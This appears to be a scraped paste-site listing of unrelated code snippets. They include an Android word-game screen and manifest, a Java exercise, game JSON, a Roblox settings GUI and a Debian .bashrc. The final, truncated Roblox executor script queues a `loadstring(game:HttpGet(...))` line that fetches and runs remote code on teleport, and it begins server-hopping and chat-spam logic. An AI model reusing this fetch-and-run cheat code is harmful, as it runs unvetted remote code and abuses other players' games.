            shuffleCurrentWord(currentWord)
        }
    }
}"
PTjBv6qP,GameScree,Samuel_Berkat_Hulu,Java,Tuesday 25th of June 2024 09:31:19 PM CDT,"package com.example.scramble_word.ui.theme

import android.app.Activity
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.safeDrawingPadding
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.wrapContentHeight
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.MaterialTheme.colorScheme
import androidx.compose.material3.MaterialTheme.shapes
import androidx.compose.material3.MaterialTheme.typography
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.material3.TextFieldDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.dimensionResource
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.viewmodel.compose.viewModel
import com.example.scramble_word.R
import com.example.scramble_word.ui.theme.Scramble_WordTheme

@Composable
fun GameScreen(gameViewModel: GameViewModel = viewModel()) {
    val gameUiState by gameViewModel.uiState.collectAsState()
    val mediumPadding = dimensionResource(R.dimen.padding_medium)

    Column(
        modifier = Modifier
            .statusBarsPadding()
            .verticalScroll(rememberScrollState())
            .safeDrawingPadding()
            .padding(mediumPadding),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {

        Text(
            text = stringResource(R.string.app_name),
            style = typography.titleLarge,
        )
        GameLayout(
            onUserGuessChanged = { gameViewModel.updateUserGuess(it) },
            wordCount = gameUiState.currentWordCount,
            userGuess = gameViewModel.userGuess,
            onKeyboardDone = { gameViewModel.checkUserGuess() },
            currentScrambledWord = gameUiState.currentScrambledWord,
            isGuessWrong = gameUiState.isGuessedWordWrong,
            modifier = Modifier
                .fillMaxWidth()
                .wrapContentHeight()
                .padding(mediumPadding)
        )
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(mediumPadding),
            verticalArrangement = Arrangement.spacedBy(mediumPadding),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {

            Button(
                modifier = Modifier.fillMaxWidth(),
                onClick = { gameViewModel.checkUserGuess() }
            ) {
                Text(
                    text = stringResource(R.string.submit),
                    fontSize = 16.sp
                )
            }

            OutlinedButton(
                onClick = { gameViewModel.skipWord() },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(
                    text = stringResource(R.string.skip),
                    fontSize = 16.sp
                )
            }
        }

        GameStatus(score = gameUiState.score, modifier = Modifier.padding(20.dp))

        if (gameUiState.isGameOver) {
            FinalScoreDialog(
                score = gameUiState.score,
                onPlayAgain = { gameViewModel.resetGame() }
            )
        }
    }
}

@Composable
fun GameStatus(score: Int, modifier: Modifier = Modifier) {
    Card(
        modifier = modifier
    ) {
        Text(
            text = stringResource(R.string.score, score),
            style = typography.headlineMedium,
            modifier = Modifier.padding(8.dp)
        )

    }
}

@Composable
fun GameLayout(
    currentScrambledWord: String,
    wordCount: Int,
    isGuessWrong: Boolean,
    userGuess: String,
    onUserGuessChanged: (String) -> Unit,
    onKeyboardDone: () -> Unit,
    modifier: Modifier = Modifier
) {
    val mediumPadding = dimensionResource(R.dimen.padding_medium)

    Card(
        modifier = modifier,
        elevation = CardDefaults.cardElevation(defaultElevation = 5.dp)
    ) {
        Column(
            verticalArrangement = Arrangement.spacedBy(mediumPadding),
            horizontalAlignment = Alignment.CenterHorizontally,
            modifier = Modifier.padding(mediumPadding)
        ) {
            Text(
                modifier = Modifier
                    .clip(shapes.medium)
                    .background(colorScheme.surfaceTint)
                    .padding(horizontal = 10.dp, vertical = 4.dp)
                    .align(alignment = Alignment.End),
                text = stringResource(R.string.word_count, wordCount),
                style = typography.titleMedium,
                color = colorScheme.onPrimary
            )
            Text(
                text = currentScrambledWord,
                style = typography.displayMedium
            )
            Text(
                text = stringResource(R.string.instructions),
                textAlign = TextAlign.Center,
                style = typography.titleMedium
            )
            OutlinedTextField(
                value = userGuess,
                singleLine = true,
                shape = shapes.large,
                modifier = Modifier.fillMaxWidth(),
                colors = TextFieldDefaults.colors(
                    focusedContainerColor = colorScheme.surface,
                    unfocusedContainerColor = colorScheme.surface,
                    disabledContainerColor = colorScheme.surface,
                ),
                onValueChange = onUserGuessChanged,
                label = {
                    if (isGuessWrong) {
                        Text(stringResource(R.string.wrong_guess))
                    } else {
                        Text(stringResource(R.string.enter_your_word))
                    }
                },
                isError = isGuessWrong,
                keyboardOptions = KeyboardOptions.Default.copy(
                    imeAction = ImeAction.Done
                ),
                keyboardActions = KeyboardActions(
                    onDone = { onKeyboardDone() }
                )
            )
        }
    }
}

/*
 * Creates and shows an AlertDialog with final score.
 */
@Composable
private fun FinalScoreDialog(
    score: Int,
    onPlayAgain: () -> Unit,
    modifier: Modifier = Modifier
) {
    val activity = (LocalContext.current as Activity)

    AlertDialog(
        onDismissRequest = {
            // Dismiss the dialog when the user clicks outside the dialog or on the back
            // button. If you want to disable that functionality, simply use an empty
            // onCloseRequest.
        },
        title = { Text(text = stringResource(R.string.congratulations)) },
        text = { Text(text = stringResource(R.string.you_scored, score)) },
        modifier = modifier,
        dismissButton = {
            TextButton(
                onClick = {
                    activity.finish()
                }
            ) {
                Text(text = stringResource(R.string.exit))
            }
        },
        confirmButton = {
            TextButton(onClick = onPlayAgain) {
                Text(text = stringResource(R.string.play_again))
            }
        }
    )
}

@Preview(showBackground = true)
@Composable
fun GameScreenPreview() {
    Scramble_WordTheme {
        GameScreen()
    }
}"
2TQwg1dD,MainActivity,Samuel_Berkat_Hulu,Java,Tuesday 25th of June 2024 09:29:28 PM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<manifest xmlns:android=""http://schemas.android.com/apk/res/android""
    xmlns:tools=""http://schemas.android.com/tools"">

    <application
        android:allowBackup=""true""
        android:dataExtractionRules=""@xml/data_extraction_rules""
        android:fullBackupContent=""@xml/backup_rules""
        android:icon=""@mipmap/ic_launcher""
        android:label=""@string/app_name""
        android:roundIcon=""@mipmap/ic_launcher_round""
        android:supportsRtl=""true""
        android:theme=""@style/Theme.Scramble_Word""
        tools:targetApi=""31"">
        <activity
            android:name="".MainActivity""
            android:exported=""true""
            android:label=""@string/app_name""
            android:theme=""@style/Theme.Scramble_Word"">
            <intent-filter>
                <action android:name=""android.intent.action.MAIN"" />

                <category android:name=""android.intent.category.LAUNCHER"" />
            </intent-filter>
        </activity>
    </application>

</manifest>"
DkPixe6T,2024 AM 06 Day 06,HarrJ,Java,Tuesday 25th of June 2024 09:17:12 PM CDT,"import java.util.Scanner;

public class Day06C {
    public static void main(String[] args) {
        Scanner uInput = new Scanner(System.in);
        int num1, num2;
        
        System.out.print(""Enter num1: "");
        num1 = uInput.nextInt();
        System.out.print(""Enter num2: "");
        num2 = uInput.nextInt();
        uInput.close();
        
// add and else if for when both number is the same
        if (num1 > num2) {
            System.out.println(num1 + "" is larger"");
        } else {
            System.out.println(num2 + "" is larger"");
        }
    }
}"
2sbtB6xF,"Roe2Js :: ""layers.json""",jargon,JSON,Tuesday 25th of June 2024 09:03:22 PM CDT,"{
	""terrain"": 0,
	""critter"": 1,
	""object"": 2,
	""ailment"": 3,
	""gui"": 4
}"
3dSS9DPd,"Roe2Js :: ""attributes.json""",jargon,JSON,Tuesday 25th of June 2024 09:01:30 PM CDT,"[
	""terrain"",
	""critter"",
	""object"",
	""ailment"",
	""gui""
]"
dNbUMDQu,Script GUI Player,im_a_user001,Lua,Tuesday 25th of June 2024 09:01:22 PM CDT,"-- FPS DOESN'T WORK SORRY :( MIGHT BE SOLVED
local UIS = game:GetService(""UserInputService"")
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local camera = workspace.CurrentCamera

-- Default values
local defaultValues = {
    SpeedChanger = 16,
    JumboostChanger = 50,
    GravityChanger = 196.2,
    PlayerFov = 70,
    HipHeight = 2,
    FPS = 60,
    ZOOM = 10
}

-- Create the main GUI
local ScreenGui = Instance.new(""ScreenGui"")
ScreenGui.Parent = player:WaitForChild(""PlayerGui"")
ScreenGui.Name = ""SettingsGui""

-- Create a draggable frame
local mainFrame = Instance.new(""Frame"")
mainFrame.Size = UDim2.new(0, 350, 0, 450)
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -225)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = ScreenGui

-- Make the frame draggable
local dragging = false
local dragInput, mousePos, framePos

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        mousePos = input.Position
        framePos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UIS.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        mainFrame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
    end
end)

-- Create a close button
local closeButton = Instance.new(""TextButton"")
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 5)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
closeButton.Text = ""X""
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextSize = 18
closeButton.Parent = mainFrame

closeButton.MouseButton1Click:Connect(function()
    mainFrame:TweenSizeAndPosition(UDim2.new(0, 0, 0, 0), UDim2.new(0.5, 0, 0.5, 0), ""Out"", ""Quad"", 0.5, true, function()
        ScreenGui:Destroy()
    end)
end)

-- Create a minimize button
local minimizeButton = Instance.new(""TextButton"")
minimizeButton.Size = UDim2.new(0, 30, 0, 30)
minimizeButton.Position = UDim2.new(1, -70, 0, 5)
minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
minimizeButton.Text = ""-""
minimizeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
minimizeButton.TextSize = 18
minimizeButton.Parent = mainFrame

local minimized = false

minimizeButton.MouseButton1Click:Connect(function()
    if minimized then
        mainFrame:TweenSize(UDim2.new(0, 350, 0, 450), ""Out"", ""Quad"", 0.5, true)
        for _, frame in pairs(mainFrame:GetChildren()) do
            if frame:IsA(""Frame"") then
                frame.Visible = true
            end
        end
    else
        mainFrame:TweenSize(UDim2.new(0, 350, 0, 50), ""Out"", ""Quad"", 0.5, true)
        for _, frame in pairs(mainFrame:GetChildren()) do
            if frame:IsA(""Frame"") then
                frame.Visible = false
            end
        end
    end
    minimized = not minimized
end)

-- Create settings frames
local function createSettingFrame(name, position)
    local frame = Instance.new(""Frame"")
    frame.Name = name
    frame.Size = UDim2.new(0, 300, 0, 50)
    frame.Position = position
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame.BorderSizePixel = 0
    frame.Parent = mainFrame

    local label = Instance.new(""TextLabel"")
    label.Size = UDim2.new(0, 100, 1, 0)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = name
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Parent = frame

    local slider = Instance.new(""TextBox"")
    slider.Name = ""Slider""
    slider.Size = UDim2.new(0, 100, 1, 0)
    slider.Position = UDim2.new(0, 110, 0, 0)
    slider.Text = ""0""
    slider.TextColor3 = Color3.fromRGB(255, 255, 255)
    slider.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    slider.BorderSizePixel = 0
    slider.Parent = frame

    local input = Instance.new(""TextBox"")
    input.Name = ""Input""
    input.Size = UDim2.new(0, 50, 1, 0)
    input.Position = UDim2.new(1, -50, 0, 0)
    input.Text = defaultValues[name]
    input.TextColor3 = Color3.fromRGB(255, 255, 255)
    input.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    input.BorderSizePixel = 0
    input.Parent = frame

    return frame
end

local SpeedChangerFrame = createSettingFrame(""SpeedChanger"", UDim2.new(0, 25, 0, 50))
local JumboostChangerFrame = createSettingFrame(""JumboostChanger"", UDim2.new(0, 25, 0, 110))
local GravityChangerFrame = createSettingFrame(""GravityChanger"", UDim2.new(0, 25, 0, 170))
local PlayerFovFrame = createSettingFrame(""PlayerFov"", UDim2.new(0, 25, 0, 230))
local HipHeightFrame = createSettingFrame(""HipHeight"", UDim2.new(0, 25, 0, 290))
local FPSFrame = createSettingFrame(""FPS"", UDim2.new(0, 25, 0, 350))
local ZOOMFrame = createSettingFrame(""ZOOM"", UDim2.new(0, 25, 0, 410))

local function slideIn(frame)
    frame.Position = frame.Position + UDim2.new(1, 0, 0, 0)
    frame:TweenPosition(frame.Position - UDim2.new(1, 0, 0, 0), ""Out"", ""Quad"", 0.5, true)
end

local function slideOut(frame)
    frame:TweenPosition(frame.Position + UDim2.new(1, 0, 0, 0), ""Out"", ""Quad"", 0.5, true, function()
        frame.Position = frame.Position - UDim2.new(1, 0, 0, 0)
    end)
end

slideIn(SpeedChangerFrame)
slideIn(JumboostChangerFrame)
slideIn(GravityChangerFrame)
slideIn(PlayerFovFrame)
slideIn(HipHeightFrame)
slideIn(FPSFrame)
slideIn(ZOOMFrame)

local function updatePlayerAttributes(frame)
    local slider = frame:FindFirstChild(""Slider"")
    local input = frame:FindFirstChild(""Input"")

    if slider and input then
        local value = tonumber(slider.Text)
        if value then
            input.Text = ""Normal"" .. frame.Name .. "": "" .. value
            if frame.Name == ""SpeedChanger"" then
                character.Humanoid.WalkSpeed = value
            elseif frame.Name == ""JumboostChanger"" then
                character.Humanoid.JumpPower = value
            elseif frame.Name == ""GravityChanger"" then
                game.Workspace.Gravity = value
            elseif frame.Name == ""PlayerFov"" then
                camera.FieldOfView = value
            elseif frame.Name == ""HipHeight"" then
                character.Humanoid.HipHeight = value
            elseif frame.Name == ""FPS"" then
                game:GetService(""RunService""):SetFPS(value)
            elseif frame.Name == ""ZOOM"" then
                camera.FieldOfView = value
            end
        end
    end
end

local function setupFrame(frame)
    local slider = frame:FindFirstChild(""Slider"")
    local input = frame:FindFirstChild(""Input"")

    if slider and input then
        slider.FocusLost:Connect(function()
            updatePlayerAttributes(frame)
        end)

        input.FocusLost:Connect(function()
            local value = tonumber(input.Text:match(""%d+""))
            if value then
                slider.Text = value
                updatePlayerAttributes(frame)
            end
        end)
    end
end

setupFrame(SpeedChangerFrame)
setupFrame(JumboostChangerFrame)
setupFrame(GravityChangerFrame)
setupFrame(PlayerFovFrame)
setupFrame(HipHeightFrame)
setupFrame(FPSFrame)
setupFrame(ZOOMFrame)
"
9yY78Dag,"Roe2Js :: ""entityRoster.json""",jargon,JSON,Tuesday 25th of June 2024 08:59:47 PM CDT,"{
	""terrain"": [
		""____"",
		""dirt"",
		""hole"",
		""watr"",
		""stps"",
		""stpw""
	],
	""critter"": [
		""____"",
		""dtby"",
		""spdr"",
		""grml"",
		""imp_"",
		""emgd"",
		""shkt"",
		""pndx""
	],
	""object"": [
		""____"",
		""door"",
		""wall"",
		""bldr"",
		""ccts"",
		""chst"",
		""pwch""
	],
	""ailment"": [
		""____"",
		""web_"",
		""wing"",
		""cure"",
		""vnom"",
		""fire"",
		""loc1"",
		""loc2"",
		""loc3"",
		""dust"",
		""zzzz""
	]
}
"
w7JyuUk2,"Roe2Js :: ""Header.js""",jargon,JavaScript,Tuesday 25th of June 2024 08:53:34 PM CDT,"
var map = map || `demo`;

//var cursor = loadJSONDirect(`/test dictionary/scripts/json/gamevars/cursor.json`);

var layers = loadJSONDirect(`/test dictionary/scripts/json/gamevars/layers.json`);

var cursor = loadJSONDirect(`/test dictionary/scripts/json/gamevars/cursor.json`);

/*
var cursor = {
	""hover"": {
		""x"": 0,
		""y"": 0,
		""z"": 0,
		""cx"": 0,
		""cy"": 0
	},
	""prev"": {
		""x"": 0,
		""y"": 0,
		""z"": 0,
		""cx"": 0,
		""cy"": 0
	}
}
*/

"
Tmnc07u8,c0ded personal full Debian bash file,Obi-Wan,Bash,Tuesday 25th of June 2024 08:32:06 PM CDT,"# System-wide .bashrc file for interactive bash(1) shells.

# To enable the settings / commands in this file for login shells as well,
# this file has to be sourced in /etc/profile.

# If not running interactively, don't do anything
[ -z ""$PS1"" ] && return

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z ""${debian_chroot:-}"" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, overwrite the one in /etc/profile)
#PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
# If id returns zero, you have root access.
if [ ""`id -u`"" -eq 0 ]; then
# You are root, set red color prompt.
  PS1=""[\[\e[1;30m\]-\[\e[1m\]\[\e[1;37m\](\[\e[0;0m\]\[\e[0;31m\]\u\[\e[1m\]\[\e[1;37m\]@\[\e[0;0m\]\[\e[0;31m\]\H\[\e[1m\]\[\e[1;37m\])\[\e[0;0m\]\[\e[1;30m\]-\[\e[1m\]\[\e[1;37m\](\[\e[0;0m\]\[\e[0;31m\]\$(date +%I:%M:%S%P)\[\e[1m\]\[\e[1;37m\])\[\e[0;0m\]\[\e[1;30m\]-\[\e[0;0m\]]\n[\[\e[1;30m\]-\[\e[1m\]\[\e[1;37m\](\[\e[0;0m\]\[\e[0;31m\]\w\[\e[1m\]\[\e[1;37m\])\[\e[0;0m\]\[\e[1;30m\]-\[\e[0;0m\]]\[\e[1;30m\]:\[\e[0;0m\]""
else
# You are user, set green color prompt.
  PS1=""[\[\e[1;30m\]-\[\e[1m\]\[\e[1;37m\](\[\e[0;0m\]\[\e[0;32m\]\u\[\e[1m\]\[\e[1;37m\]@\[\e[0;0m\]\[\e[0;32m\]\H\[\e[1m\]\[\e[1;37m\])\[\e[0;0m\]\[\e[1;30m\]-\[\e[1m\]\[\e[1;37m\](\[\e[0;0m\]\[\e[0;32m\]\$(date +%I:%M:%S%P)\[\e[1m\]\[\e[1;37m\])\[\e[0;0m\]\[\e[1;30m\]-\[\e[0;0m\]]\n[\[\e[1;30m\]-\[\e[1m\]\[\e[1;37m\](\[\e[0;0m\]\[\e[0;32m\]\w\[\e[1m\]\[\e[1;37m\])\[\e[0;0m\]\[\e[1;30m\]-\[\e[0;0m\]]\[\e[1;30m\]:\[\e[0;0m\]""
fi

# Commented out, don't overwrite xterm -T ""title"" -n ""icontitle"" by default.
# If this is an xterm set the title to user@host:dir
#case ""$TERM"" in
#xterm*|rxvt*)
#    PROMPT_COMMAND='echo -ne ""\033]0;${USER}@${HOSTNAME}: ${PWD}\007""'
#    ;;
#*)
#    ;;
#esac

# enable bash completion in interactive shells
#if ! shopt -oq posix; then
#  if [ -f /usr/share/bash-completion/bash_completion ]; then
#    . /usr/share/bash-completion/bash_completion
#  elif [ -f /etc/bash_completion ]; then
#    . /etc/bash_completion
#  fi
#fi

# if the command-not-found package is installed, use it
if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found ]; then
	function command_not_found_handle {
	        # check because c-n-f could've been removed in the meantime
                if [ -x /usr/lib/command-not-found ]; then
		   /usr/bin/python /usr/lib/command-not-found -- ""$1""
                   return $?
                elif [ -x /usr/share/command-not-found/command-not-found ]; then
		   /usr/bin/python /usr/share/command-not-found/command-not-found -- ""$1""
                   return $?
		else
		   printf ""%s: command not found\n"" ""$1"" >&2
		   return 127
		fi
	}
fi

# system aliases
alias sysinfo='perl /home/c0ded/sysinfo.pl'
alias netrestart='/etc/init.d/networking stop && /etc/init.d/networking start'
alias sshreload='/etc/init.d/ssh reload'
alias showmotd='/usr/local/dynmotd.sh'
alias py='python ""$@""'
alias showtar='tar -tf ""$@""'
alias untar='tar -xf ""$@""'
alias mktar='tar -cpszf ""$@""'
alias dns='host ""$@""'
alias serv='service ""$@""'
alias editipt='nano /etc/network/iptables'
alias editipt6='nano /etc/network/ip6tables'
alias lookfor='find . | grep -i -s -e ""$@""'
alias plist='ps aux --sort=+start_time'
alias psl='ps aux --sort=+start_time'

# go sudo up aliases
alias goroot='sudo su -'
alias goc0ded='sudo su - c0ded'
alias goccirc='sudo su - ccirc'
alias goex0a='sudo su - ex0a'
alias gosbwwwdev='sudo su - sbwwwdev'

function go {
  useracc=""$1""
  if [ $useracc ]; then
    if [ $useracc == ""root"" ]; then
      sudo su -
    elif [ $useracc == ""c0ded"" ]; then
      sudo su - c0ded
    elif [ $useracc == ""ccirc"" ]; then
      sudo su - ccirc
    elif [ $useracc == ""ex0a"" ]; then
      sudo su - ex0a
    elif [ $useracc == ""sb"" ]; then
      sudo su - sbwwwdev
    else
      echo ""Unknown Command. (ex: go <root|c0ded>)""
    fi
  else
    echo ""Unknown Command. (ex: go <root|c0ded>)""
  fi
}

# speedtests.
function speedtest {
  testtype=""$1""
  if [ $testtype ]; then
    if [ $testtype == 1 ]; then
      shift;
      python /home/c0ded/speedtests/speedtest-cli.py ""$@""
    elif [ $testtype == 2 ]; then
      shift;
      python /home/c0ded/speedtests/tespeed/tespeed.py ""$@""
    else
      echo Unknown Command. \(ex: speedtest 1 / speedtest 2\)
    fi
  else
    echo Unknown Command. \(ex: speedtest 1 / speedtest 2\)
  fi
}

# auto write to maintencance file, enable if your using the dynmotd.sh on login. (make sure to # chmod 666 /usr/local/motd.maint #)
function maint {
  echo ""\""$@\""""
  read -p ""Write this issue to the Maintenance file? Note: This will overwrite anything currently in the file. (y/n): "" yn
  case $yn in
    [Yy]* )
      echo $@ > /usr/local/motd.maint
      echo ""Process Complete!""
      echo ""Issue: \""$@\"" has been writen to the Maintenance file. (/usr/local/motd.maint)""
        ;;
    [Nn]* )
      echo ""Process Halted: nothing was writen to the Maintenance file. (/usr/local/motd.maint)""
        ;;
    * ) echo ""Error: Please select Yes(y) or No(n)."";;
  esac
}

# display all server addresses
function showips {
  echo ""Ipv4 Main IP:""
  echo ""->""
  /sbin/ifconfig eth0 | grep ""inet addr"" | cut -d "":"" -f 2 | cut -d "" "" -f 1
  echo ""#---------------#""
  echo ""Ipv4 IP #2:""
  echo ""->""
  /sbin/ifconfig eth0:0 | grep ""inet addr"" | cut -d "":"" -f 2 | cut -d "" "" -f 1
  echo ""#---------------#""
  echo ""Ipv4 IP #3:""
  echo ""->""
  /sbin/ifconfig eth0:1 | grep ""inet addr"" | cut -d "":"" -f 2 | cut -d "" "" -f 1
  echo ""#---------------#""
  echo ""Ipv4 IP #4:""
  echo ""->""
  /sbin/ifconfig eth0:2 | grep ""inet addr"" | cut -d "":"" -f 2 | cut -d "" "" -f 1
  echo ""#---------------#""
  echo ""Ipv6 All IPs:""
  echo ""-->""
  scopeladdr=$(/sbin/ifconfig eth0 | grep ""inet6 addr"" | cut -d "":"" -f 2- | cut -d ""/"" -f 1 | cut -d "" "" -f 2 | sed -e '/2001:*/d')
  /sbin/ifconfig eth0 | grep ""inet6 addr"" | cut -d "":"" -f 2- | cut -d ""/"" -f 1 | cut -d "" "" -f 2 | sed -e '/fe80::e269:95ff:fe63:33d2/d'
  echo ""#---------------------------------------#""
  echo $scopeladdr [Scope Link]
  echo ""#---------------------------------------#""
}

# quick log checker/reader
function chklog {
  logfile=""$@""
  if [ -f /var/log/$logfile ]; then
    nano /var/log/$logfile
  else
    echo Unable to open file: ""/var/log/$logfile"" \(Log file does not exist.\)
  fi
}

# quick mail checker/reader
function chkmail {
  mymail=""$(whoami)""
  if [ -f /var/mail/$mymail ]; then
    nano /var/mail/$mymail
  else
    echo Unable to open file: ""/var/mail/$mymail"" \(Mail file does not exist.\)
  fi
}

# process scan
function pschk {
  pschk=""$@""
  echo Checking All Running Processes For: ""$pschk"" ----\>
  echo ""USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND""
  ps aux | grep ""$pschk""
  echo Running Process ID Scan 1 \(pgrep\):
  pgrep -l $pschk
  echo Running Process ID Scan 2 \(pidof\):
  pidof $pschk
}

# ping shortcuts:
function p {
  ping -c 4 ""$@""
}
function p6 {
  ping6 -c 4 ""$@""
}
function pp {
  /home/c0ded/paping ""$@"" -c 4
}
function paping {
  /home/c0ded/paping ""$@""
}

#alias paping='/home/c0ded/paping $@'

# installed packages scan
function installed {
  pkgsearch=""$@""
  dpkg -l *$pkgsearch* | grep ""Desired""
  dpkg -l *$pkgsearch* | grep ""|""
  echo +++-===========================================================================================================-+++
  dpkg -l *$pkgsearch* | grep ""ii""
  pkguninstalls=$(dpkg -l *$pkgsearch* | grep ""ii"" | cut -d "" "" -f3 | paste -sd "" "")
  echo aptitude remove $pkguninstalls
}

# make openssl server.key file
function mkserverkey {
  openssl genrsa -out server.key 2048
  openssl req -new -key server.key -out server.csr
  openssl x509 -req -days 3650 -in server.csr -signkey server.key -out server.crt
}

# auto network connections check.
function netcon {
  chktype=""$@""
  if [ $chktype ]; then
    if [ $chktype == 1 ]; then
      lsof -i
    elif [ $chktype == 2 ]; then
      netstat -anp
    else 
      echo Unknown Command. \(ex: metcon 1 / netcon 2\)
    fi
  else 
    echo Unknown Command. \(ex: metcon 1 / netcon 2\)
  fi
}

function servchk {
  echo ""Initiating Server Systems (Processes/Network Connections/FW Rules) Check...""
  read -p ""Check Processes (ps aux). (y/n): "" yn
  case $yn in
    [Yy]* )
      echo ""Running Processes Check (ps aux)...""
      ps aux
      read -p ""Check Network Connections (netstat -anp/lsof -i). (y/n): "" yn
      case $yn in
        [Yy]* )
          echo ""Running Network Connections Check (netstat -anp/lsof -i)...""
          netstat -anp
          lsof -i
          read -p ""Check FW Rules [IPv4/IPv6] (iptables -L/ip6tables -L). (y/n): "" yn
          case $yn in
            [Yy]* )
              echo ""Running Network Connections Check (iptables -L/ip6tables -L)...""
              iptables -L
              ip6tables -L
              echo ""Server Systems Check Complete.""
                ;;
            [Nn]* )
              echo ""Server Systems Check Halted: FW Rules check was Not initiated.""
                ;;
            * ) echo ""Error: Please select Yes(y) or No(n)."";;
          esac
            ;;
        [Nn]* )
          echo ""Server Systems Check Halted: Network Connections check was not initiated.""
            ;;
        * ) echo ""Error: Please select Yes(y) or No(n)."";;
      esac
        ;;
    [Nn]* )
      echo ""Server Systems Check Halted: Processes check was not initiated.""
        ;;
    * ) echo ""Error: Please select Yes(y) or No(n)."";;
  esac
}

function netcmds {
  echo ""[Server Network/Bandwidth Information]""
  echo ""Commands List:""
  echo ""01. 'tcpdump'""
  echo ""02. 'nload'""
  echo ""03. 'iftop'""
  echo ""04. 'iptraf'""
  echo ""05. 'nethogs'""
  echo ""06. 'bmon'""
  echo ""07. 'slurm'""
  echo ""08. 'tcptrack'""
  echo ""09. 'vnstat'""
  echo ""10. 'bwm-ng'""
  echo ""[End of Commands List]""
}

function logsizes {
  echo """"
  echo ""[/var/log/ Dir List]:""
  echo ""----------------------""
  ls -lah /var/log/
  echo ""----------------------""
  echo """"
  echo ""[Disk Space In Use]:""
  echo ""----------------------""
  df -h
  echo ""----------------------""
  echo """"
  echo ""[/var/log/ MB List]:""
  echo ""----------------------""
  du -sh /var/log/* |grep M
  echo ""----------------------""
  echo """"
  echo ""[/var/log/ GB List]:""
  echo ""----------------------""
  du -sh /var/log/* |grep G
  echo ""----------------------""
}

function showload {
  UTINFO=$(uptime)
  if [[ $UTINFO = *min* ]]; then
    GETUPTIME=$(uptime | sed 's/.*up[[:space:]]*//;s/,[^,]*[userusers].*//' | awk {'print $1"" ""$2"" ""$3"" ""$4'})
    GETUSERS=$(uptime | sed -r 's/^.*min,  //' | sed -r 's/ .[load].*//')
  else
    GETUPTIME=$(uptime | sed 's/.*up[[:space:]]*//;s/,[^,]*[userusers].*//' | awk {'print $1"" ""$2"" ""$3'})
    GETUSERS=$(uptime | sed -r 's/^.*up.*:[0-9]+,. //' | sed -r 's/ .[load].*//')
  fi
  USERS=${GETUSERS//,}
  UPTIME=$GETUPTIME
  #LOADAVGS=$(cat /proc/loadavg | awk {'print ""(""$1"", ""$2"". ""$3"")""'} | sed 's|[()]||g')
  LOADAVGS=$(cat /proc/loadavg | awk {'print ""(""$1"", ""$2"". ""$3"")""'} | tr -d '()')
  echo [Current Load Average Data]:
  echo -Users: ""$USERS""
  echo -Uptime: ""$UPTIME""
  echo -Load Average: ""$LOADAVGS""
}

"
pgTJrCxG,Untitled,lovredev2,Lua,Tuesday 25th of June 2024 08:13:11 PM CDT,"queue_on_teleport([[loadstring(game:HttpGet(""https://pastebin.com/raw/pgTJrCxG""))()]])

local Players = game:GetService(""Players"")
local HttpService = game:GetService(""HttpService"")
local TeleportService = game:GetService(""TeleportService"")
local TextChatService = game:GetService(""TextChatService"")

local GAMES_API = ""https://games.roblox.com/v1/games/""
local SERVER_API = ""/servers/Public?sortOrder=Asc&limit=100""

local placeId, jobId = game.PlaceId, game.JobId
local servers = GAMES_API .. placeId .. SERVER_API

local messages = {{""xd""}, {""hi""}}

local function ListServers(cursor)
